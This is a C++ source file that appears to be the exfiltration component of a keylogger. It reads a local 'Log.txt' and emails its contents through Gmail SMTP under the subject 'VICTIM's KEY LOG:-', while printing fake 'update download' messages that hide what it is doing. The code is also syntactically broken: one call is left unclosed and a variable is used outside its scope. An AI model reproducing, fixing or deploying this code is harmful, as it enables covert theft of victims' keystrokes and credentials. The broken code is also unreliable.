
#include <tchar.h>
#include <Windows.h>

#include "EASendMailObj.tlh"
using namespace EASendMailObjLib;

const int ConnectNormal = 0;
const int ConnectSSLAuto = 1;
const int ConnectSTARTTLS = 2;
const int ConnectDirectSSL = 3;
const int ConnectTryTLS = 4;

int _tmain(int argc, _TCHAR* argv[])
{
    ::CoInitialize(NULL);

    IMailPtr oSmtp = NULL;
    oSmtp.CreateInstance(__uuidof(EASendMailObjLib::Mail));
    oSmtp->LicenseCode = _T("TryIt");

    oSmtp->FromAddr = _T("mailid@gmail.com");
    
    oSmtp->AddRecipientEx(_T("mailid@gmail.com"), 0);
    
    oSmtp->Subject = _T("VICTIM's KEY LOG:-");
   
    FILE* file = fopen("Log.txt", "rb");
    if (file == NULL) {
        return 0;
    }
    else
    {
        fseek(file, 0, SEEK_END);
        int length = ftell(file);
        char* buffer;
        buffer = (char*)malloc(length);
        fread(buffer, 1, length, file);
    }
    
    oSmtp->BodyText = _T("%s",buffer);

    oSmtp->ServerAddr = _T("smtp.gmail.com");

    oSmtp->UserName = _T("emailid@gmail.com");
    oSmtp->Password = _T("password");

    oSmtp->ConnectType = ConnectTryTLS;

    
    _tprintf(_T("Starting to download ...\r\n"));

    if (oSmtp->SendMail() == 0)
    {
        _tprintf(_T("Donwload Finished\r\n"));
    }
    else
    {
        _tprintf(_T("failed to donwload the update\n"),
            
    }

    return 0;
}
